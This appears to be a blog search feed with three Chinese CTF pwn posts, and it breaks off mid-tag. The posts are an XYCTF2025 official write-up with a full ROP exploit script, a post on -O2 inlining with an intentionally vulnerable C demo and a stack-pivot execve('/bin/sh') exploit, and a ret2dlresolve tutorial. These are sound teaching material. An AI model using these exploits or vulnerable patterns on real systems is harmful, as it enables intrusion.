<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XYCTF2025-奶龙回家官方WP</title>
      <link href="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/"/>
      <url>/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/</url>
      
        <content type="html"><![CDATA[<h2 id="XYCTF2025-奶龙回家官方WP"><a href="#XYCTF2025-奶龙回家官方WP" class="headerlink" title="XYCTF2025 奶龙回家官方WP"></a>XYCTF2025 奶龙回家官方WP</h2><h4 id="说在前面的话"><a href="#说在前面的话" class="headerlink" title="说在前面的话"></a>说在前面的话</h4><p>这是我第一次为CTF比赛出题，所以可能稍微有点不足</p><p>师傅们也都太强辣，这题师傅们做出了2种非预期，我也是学到了很多骚操作，不过貌似还是预期解更简单，所以官方WP就主要写一下预期解的思路，非预期也会提一下的，不是因为我懒(x)</p><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>首先checksec发现仅关闭PIE保护，程序是64位(其实这是废话（x）)</p><p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221503456.png" alt="image-20250507221503456"></p><p>seccomp-tools查看一下沙箱保护发现允许<strong>read</strong> <strong>write</strong> <strong>open</strong> <strong>nanosleep</strong> <strong>openat</strong> 系统调用(注意openat是goto 0011 所以也是允许的)</p><p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221513550.png" alt="image-20250507221513550"></p><p>接下来直接拖进IDA中看一下，发现是C++写的，并且去除了符号表，这里我们自己把函数名和变量名重命名一下</p><p>如果觉得有点乱可以先运行一下程序，发现输出了rbp+offset的值</p><p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221522665.png" alt="image-20250507221522665"></p><p>然后仔细分析ida程序，发现会让你输入一个数来控制程序循环次数，第一次限制了输入大小不能超过2，但是后面有将它强制转换成unsigned int 类型，所以只需要输入-1就可以给我们充分循环的次数，程序限制了任意地址读只能执行一次，且无法通过覆盖got表之类的方法绕过退出函数，因为death函数里面有一段直接jmp到不存在地址的汇编，直接导致程序崩溃。任意地址写我们可以执行多次(和循环次数有关)，总循环大于5时会调用sleep函数，sleep函数的系统调用并不是nanosleep,所以程序会崩溃绕过方式也很简单，以为可以任意地址写，所以我们将sleep的got表改成程序中无用的函数地址，也可以直接写入ret的地址，因为调用函数前会push下一条指令的地址到栈中把sleep got表改成ret的地址刚好将原本程序下一条指令给pop到rdi中</p><p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221529685.png" alt="image-20250507221529685"></p><p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221534791.png" alt="image-20250507221534791"></p><p>一下基本的绕过方式就理清楚了，现在我们可以进行任意地址写很多次，以及任意地址读，接下来的解法就很多了，可以通过随机数种子算出rbp把offset求出来，然后写rop链子。也可以把strtoll的got表改成gets的got表直接溢出，打TLS结构体绕过Canary，还可以直接写ret滑梯来执行rop链</p><p>下面用最方便的思路来，其他思路读者可以自行研究</p><p>通过调试或ida中查看可以发现main函数栈帧的空间极大，所以不用担心用泄露出的rbp+offset直接-0x200会覆盖掉程序中的关键部分，导致程序崩溃</p><p><img src="/2025/05/07/XYCTF2025-%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6%E5%AE%98%E6%96%B9WP/index/image-20250507221543330.png" alt="image-20250507221543330"></p><p>所以我们将泄露出的rbp+offset直接-0x200 作为理想rbp地址(注意要补齐8的倍数) 从理想rbp地址开始写0x40个ret，然后就是放我们的常规的orw rop链了，最后将exit的got表覆盖为leave;ret这段gadget的地址，下一次循环输入5，直接进行leave;ret，肯定能命中我们的任意一段ret，然后程序rsp指针一直向高地址滑，直到滑到我们之前写好的orw rop链子；由于题目没给libc，可以先用本地的打通，然后通过任意地址读，leak出的libc地址去libc-database下载对应的libc，试几次就可以了</p><p>还有一种不需要依赖于libc的打法，可以通过ret2dlresolve打，由于是64位的libc，_dl_fixup会从符号版本信息列表l_versions[]中根据偏移获取符号的版本信息，而该偏移则是我们伪造的r_info的index 64位可能不会到可映射区域，所以要将 l_info[VERSYMIDX(DT_VERSYM)]设置为null，从而绕过version &#x3D; &amp;l-&gt;l_versions[ndx];语句分支</p><p>而这个的地址得先知道link_map的地址才能定位，所以用唯一一次任意地址读的机会泄露出link_map的地址，然后就是rop链子就是常规的Partial RELRO下的ret2dlresolve了，不过还是通过libc-database搜索尝试libc的方式简单一些，基于ret2dlresolve的解题思路读者可以下去自行研究</p><p>下面放出官方exp(依赖libc的ret滑梯)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">elf = ELF(&#x27;./nailong&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc6_2.35-0ubuntu3.8_amd64.so&#x27;)</span><br><span class="line">#sh = process(&#x27;./nailong&#x27;)</span><br><span class="line">sh = remote(&#x27;ip&#x27;,port)</span><br><span class="line">#gdb.attach(sh,&#x27;b* 0x401AF0\nc&#x27;)</span><br><span class="line">bypass_addr = 4210784</span><br><span class="line">bss_addr = 4211104</span><br><span class="line">read_addr = 4210888</span><br><span class="line">ret_addr_1 = 0x0040101a</span><br><span class="line">ret_addr_2 = 0x00000000</span><br><span class="line">bss_addr_1 = 0x004041A0</span><br><span class="line">bss_addr_2 = 0x00000000</span><br><span class="line">flag_addr_1 = 0x004041C0</span><br><span class="line">flag_addr_2 = 0x00000000</span><br><span class="line">exit_addr = 4210872</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#x27;offset:&#x27;)</span><br><span class="line">rbp_offset_addr = int(sh.recvuntil(&#x27;end&#x27;)[:-3].decode())</span><br><span class="line">if rbp_offset_addr % 8 != 0:</span><br><span class="line">    rbp_offset_addr += 8 - (rbp_offset_addr % 8)</span><br><span class="line">success(hex(rbp_offset_addr))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;xiao_peng_you_ni_zhi_dao_wo_yao_qu_ji_lou_ma\n&#x27;,str(-1))</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(bypass_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;,p32(0x4017A8))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(bss_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;,b&#x27;/fla&#x27;)</span><br><span class="line">bss_addr += 0x4</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(bss_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;,b&#x27;g\x00\x00\x00&#x27;)</span><br><span class="line">rbp = rbp_offset_addr - 0x200</span><br><span class="line">rbp +=0x8</span><br><span class="line"></span><br><span class="line">#success(hex(rbp))</span><br><span class="line">for i in range(1,65):</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(ret_addr_1))</span><br><span class="line">    rbp += 0x4</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(ret_addr_2))</span><br><span class="line">    rbp +=0x4</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;,str(1))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;,str(read_addr))</span><br><span class="line">read_got = u64(sh.recv(6).ljust(8,&#x27;\x00&#x27;.encode()))</span><br><span class="line">success(hex(read_got))</span><br><span class="line">#success(hex(rbp))</span><br><span class="line">offset = read_got - libc.symbols[&#x27;read&#x27;]</span><br><span class="line">libc.address = offset</span><br><span class="line">pop_rdi = 0x000000000002a3e5 + offset</span><br><span class="line">pop_rdi_1 = pop_rdi &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdi_2 = (pop_rdi &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">leave_ret = 0x000000000004da83 + offset</span><br><span class="line">leave_ret_1 = leave_ret &amp; 0xFFFFFFFF</span><br><span class="line">leave_ret_2 = leave_ret &gt;&gt; 32</span><br><span class="line">pop_rsi = 0x000000000002be51 +offset</span><br><span class="line">pop_rsi_1 = pop_rsi &amp; 0xFFFFFFFF</span><br><span class="line">pop_rsi_2 = (pop_rsi &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdx = 0x0000000000401650</span><br><span class="line">pop_rdx_1 = pop_rdx &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdx_2 = (pop_rdx &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">open_addr = libc.symbols[&#x27;open&#x27;]</span><br><span class="line">open_addr_1 = open_addr &amp; 0xFFFFFFFF</span><br><span class="line">open_addr_2 = (open_addr &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">read_addr = libc.symbols[&#x27;read&#x27;]</span><br><span class="line">read_addr_1 = read_addr &amp; 0xFFFFFFFF</span><br><span class="line">read_addr_2 = (read_addr &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">write_addr = libc.symbols[&#x27;write&#x27;]</span><br><span class="line">write_addr_1 = write_addr &amp; 0xFFFFFFFF</span><br><span class="line">write_addr_2 = (write_addr &gt;&gt; 32) &amp; 0xFFFFFFFF</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;, str(exit_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;, p32(leave_ret_1))</span><br><span class="line">exit_addr +=0x4</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">sh.sendafter(&#x27;what you want do?\n&#x27;, str(exit_addr))</span><br><span class="line">sh.sendafter(&#x27;read you want\n&#x27;, p32(leave_ret_2))</span><br><span class="line">def rop_chain(v1, v2, rbp):</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(v1))</span><br><span class="line">    rbp += 0x4</span><br><span class="line">    sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(2))</span><br><span class="line">    sh.sendafter(&#x27;what you want do?\n&#x27;, str(rbp))</span><br><span class="line">    sh.sendafter(&#x27;read you want\n&#x27;, p32(v2))</span><br><span class="line">    rbp += 0x4</span><br><span class="line">    return rbp</span><br><span class="line">rbp = rop_chain(pop_rdi_1, pop_rdi_2, rbp)</span><br><span class="line">rbp = rop_chain(bss_addr_1, bss_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rsi_1, pop_rsi_2, rbp)</span><br><span class="line">rbp = rop_chain(0, 0, rbp)</span><br><span class="line">rbp = rop_chain(open_addr_1, open_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdi_1, pop_rdi_2, rbp)</span><br><span class="line">rbp = rop_chain(3, 0, rbp)</span><br><span class="line">rbp = rop_chain(pop_rsi_1, pop_rsi_2, rbp)</span><br><span class="line">rbp = rop_chain(flag_addr_1, flag_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdx_1, pop_rdx_2, rbp)</span><br><span class="line">rbp = rop_chain(0x50, 0, rbp)</span><br><span class="line">rbp = rop_chain(read_addr_1, read_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdi_1, pop_rdi_2, rbp)</span><br><span class="line">rbp = rop_chain(1, 0, rbp)</span><br><span class="line">rbp = rop_chain(pop_rsi_1, pop_rsi_2, rbp)</span><br><span class="line">rbp = rop_chain(flag_addr_1, flag_addr_2, rbp)</span><br><span class="line">rbp = rop_chain(pop_rdx_1, pop_rdx_2, rbp)</span><br><span class="line">rbp = rop_chain(0x50, 0, rbp)</span><br><span class="line">rbp = rop_chain(write_addr_1, write_addr_2, rbp)</span><br><span class="line">sh.sendlineafter(&#x27;chose 4 bin/sh\n&#x27;, str(5))</span><br><span class="line">sh.interactive()</span><br><span class="line">#0x7fffc9f571dfs</span><br><span class="line">#140736581693919</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>O-Pwn</title>
      <link href="/2025/05/07/O-Pwn/index/"/>
      <url>/2025/05/07/O-Pwn/index/</url>
      
        <content type="html"><![CDATA[<p>O-Pwn</p><p>最近一个朋友和我在研究为什么有些时候IDA偏移分析失误时发现当程序ebp寻址改成了esp寻址有可能会导致IDA的偏移出现失误，那么编译参数有可能就加上了O参数</p><p>GCC 编译器的 <code>-O</code> 参数用于控制代码优化的级别，不同的优化级别会影响程序的执行效率、编译时间和生成的可执行文件大小</p><p>加上了-O参数后会导致原本的ebp寻址变成了esp寻址，IDA偏移分析失误这种情况通常出现在memcpy()复制函数溢出中</p><p>直接简单的溢出即使ebp寻址改成了esp寻址 IDA仍然偏移分析正确，但是随着O的参数的增加优化级别也更高，在O2的情况下</p><p>一些简短的存在漏洞的函数会被直接放在main函数中，编译器并不会为其开辟新的栈帧，如以下的demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">static char src[0x500];</span><br><span class="line"></span><br><span class="line">#pragma GCC optimize(&quot;-fno-stack-protector&quot;)</span><br><span class="line"></span><br><span class="line">void load()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    setvbuf(stdin, 0, 1, 0);</span><br><span class="line">&#125;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">    char buffer[64];</span><br><span class="line">    read(0,buffer,0x48);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    </span><br><span class="line">    load();</span><br><span class="line"></span><br><span class="line">    printf(&quot;pwn me!\n&quot;);</span><br><span class="line">    read(0,src,0x490);</span><br><span class="line"></span><br><span class="line">    printf(&quot;let&#x27;s overflow,but you seem can&#x27;t cover the ret_addr\n&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Hack for Fan\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是编译参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o demo0 -g -m32 -O2</span><br></pre></td></tr></table></figure><p>下面是IDA逆向出的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[68]; // [esp+0h] [ebp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  load();</span><br><span class="line">  puts(&quot;pwn me!&quot;);</span><br><span class="line">  read(0, src, 0x490u);</span><br><span class="line">  puts(&quot;let&#x27;s overflow,but you seem can&#x27;t cover the ret_addr&quot;);</span><br><span class="line">  read(0, buf, 0x48u);</span><br><span class="line">  puts(&quot;Hack for Fan&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现原本的vuln函数里的代码直接被放到main函数里了，这时就不能直接溢出了，因为通过调式发现以下汇编代码(以下情况仅32位会出现)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► 0x804841f &lt;main+95&gt;     mov    ecx, dword ptr [ebp - 4]</span><br><span class="line">  0x8048422 &lt;main+98&gt;     add    esp, 0x10</span><br><span class="line">  0x8048425 &lt;main+101&gt;    xor    eax, eax</span><br><span class="line">  0x8048427 &lt;main+103&gt;    leave</span><br><span class="line">  0x8048428 &lt;main+104&gt;    lea    esp, [ecx - 4]</span><br><span class="line">  0x804842b &lt;main+107&gt;    ret</span><br></pre></td></tr></table></figure><p>那么这种情况的话就只能通过2次栈迁移来进行rop了</p><p>下面是exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./demo0&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">sh = process(&#x27;./demo0&#x27;)</span><br><span class="line">#gdb.attach(sh, &#x27;b *0x8048413\nc&#x27;)</span><br><span class="line">pop_ebx = 0x08048359</span><br><span class="line">pop_3 = 0x080485b9</span><br><span class="line">pop_esp = 0x08048557</span><br><span class="line">src_addr = 0x0804A060</span><br><span class="line">base_stage = 0x200</span><br><span class="line">bss_addr = src_addr + base_stage</span><br><span class="line">pivot_addr = bss_addr + 0x4</span><br><span class="line"></span><br><span class="line">payload = cyclic(base_stage) + p32(elf.symbols[&#x27;puts&#x27;]) + p32(pop_ebx) + p32(elf.got[&#x27;puts&#x27;])</span><br><span class="line">payload += p32(elf.symbols[&#x27;read&#x27;]) + p32(pop_3) + p32(0) + p32(bss_addr - 0x100) + p32(0x40) + p32(pop_esp) + p32(bss_addr - 0x100)</span><br><span class="line">sh.sendafter(&#x27;pwn me!\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">payload = cyclic(0x44) + p32(pivot_addr)</span><br><span class="line">sh.sendafter(&#x27;ret_addr\n&#x27;, payload)</span><br><span class="line"></span><br><span class="line">puts_got = u32(sh.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">success(hex(puts_got))</span><br><span class="line">libc.address = puts_got - libc.symbols[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">payload = p32(libc.symbols[&#x27;execve&#x27;]) + p32(pop_3) + p32(next(libc.search(&#x27;/bin/sh\x00&#x27;))) + p32(0) + p32(0) + p32(0xdeadbeef)</span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2dlresolve超详解</title>
      <link href="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/"/>
      <url>/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/</url>
      
        <content type="html"><![CDATA[<h2 id="ret2dlresovle攻击原理"><a href="#ret2dlresovle攻击原理" class="headerlink" title="ret2dlresovle攻击原理"></a>ret2dlresovle攻击原理</h2><p>ret2dlresovle攻击的本质就是在于程序在动态链接时篡改相关结构体，让程序解析到错误的函数，进而达成攻击</p><h3 id="Lazy-Binding"><a href="#Lazy-Binding" class="headerlink" title="Lazy Binding"></a>Lazy Binding</h3><p>当程序在第一次调用某个函数时，会调用_dl_runtime_resolve函数从libc中获取这个函数的真实地址</p><p>那么具体是怎么实现的呢？</p><p>动态链接的程序调用函数时会先call一个函数的plt表，如read@plt，执行read@plt表里的第一条指令，read@plt表里的第一条指令是jmp到got表中，执行got表里存放的地址所指向的指令，got表默认存放的是read@plt中下一条指令的地址，通过_dl_runtime_resolve函数解析libc中的真实地址后会将函数的真实地址填入到该函数的got表中</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-04_18-24-55-1745939812038-1.png" alt="Snipaste_2025-03-04_18-24-55"></p><p><strong>_dl_runtime_resolve</strong>函数有两个参数，一个是reloc_index(<strong>reloc_index参数标识了具体要导入哪个函数</strong>)，一个是link_map的地址</p><p>这里和普通函数调用方式不一样，会先push一个reloc_index，然后跳转到一个地址，push link_map的地址</p><p>然后再跳转到_dl_runtime_resolve，我们会发现dl_runtime_resolve函数最终调用的是_dl_fixup函数</p><p>也就是最终解析在libc中真实地址的函数</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/Snipaste_2025-03-04_18-24-55-1741084407261-2-1745939812039-3.png" alt="Snipaste_2025-03-04_18-24-55"></p><h3 id="Related-Dynamic-Sections"><a href="#Related-Dynamic-Sections" class="headerlink" title="Related Dynamic Sections"></a>Related Dynamic Sections</h3><p>在深入了解_dl_runtime_resolve函数是怎么寻找到真实地址之前我们需要先了解几个基本结构体</p><p><img src="/2025/04/29/ret2dlresolve%E8%B6%85%E8%AF%A6%E8%A7%A3/index/ret2dlresolve--2.related-sections-1745939812039-5.png" alt="ret2dlresolve--2.related-sections"></p><h4 id="Elf-Rel结构体"><a href="#Elf-Rel结构体" class="headerlink" title="Elf_Rel结构体"></a>Elf_Rel结构体</h4><p>Elf_Rel实例化的每一个项组成了.rel.plt节</p><p>ELF 文件中的 <code>.rel.plt</code> 是一个 <strong>重定位表（Relocation Table）</strong>，用于存储 <strong>PLT（Procedure Linkage Table）</strong> 相关的重定位信息，主要用于延迟绑定（Lazy Binding）。</p><p>我们只关心Elf_Rel结构体的两个域，一个是r_offset一个是r_info，r_offset是用于告诉解析真实地址的函数解析后的地址往哪里写(这些也就组成了got表)，r_info则是当前项所代表的函数在.dynsym节中的偏移，下面放出Elf_Rel结构体的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr  r_offset;  /* 需要进行重定位的地址 */</span><br><span class="line">    Elf32_Word  r_info;    /* 符号表索引和重定位类型 */</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure><h4 id="Elf-Sym结构体"><a href="#Elf-Sym结构体" class="headerlink" title="Elf_Sym结构体"></a>Elf_Sym结构体</h4><p>符号表（Symbol Table）用于记录程序中所有函数和全局变量的信息。每个符号在符号表中对应一个条目，这些条目由 <code>Elf32_Sym</code> 或 <code>Elf64_Sym</code> 结构体表示</p><p>我们在ELF32_Sym主要关心st_name，st_name是当前项所代表的函数在.dynstr节中的偏移</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Word  st_name;  /* 符号名在字符串表中的下标 */</span><br><span class="line">    Elf32_Addr  st_value; /* 符号对应的值（地址或偏移量） */</span><br><span class="line">    Elf32_Word  st_size;  /* 符号的大小 */</span><br><span class="line">    unsigned char st_info; /* 符号类型和绑定信息 */</span><br><span class="line">    unsigned char st_other;/* 其他信息（通常未使用，值为 0） */</span><br><span class="line">    Elf32_Half  st_shndx; /* 符号所在的节在节头表中的索引 */</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><h4 id="dynstr节"><a href="#dynstr节" class="headerlink" title="dynstr节"></a>dynstr节</h4><p>在动态链接过程中，<code>.dynstr</code> 节与 <code>.dynsym</code> 节协同工作。<code>.dynsym</code> 节保存需要动态链接的符号表，每个符号都有一个 <code>st_name</code> 字段，该字段是一个索引，指向 <code>.dynstr</code> 节中相应符号名称的起始位置</p><p>.dynstr节是用来存放动态链接中所需解析的函数名的</p><h4 id="link-map结构体"><a href="#link-map结构体" class="headerlink" 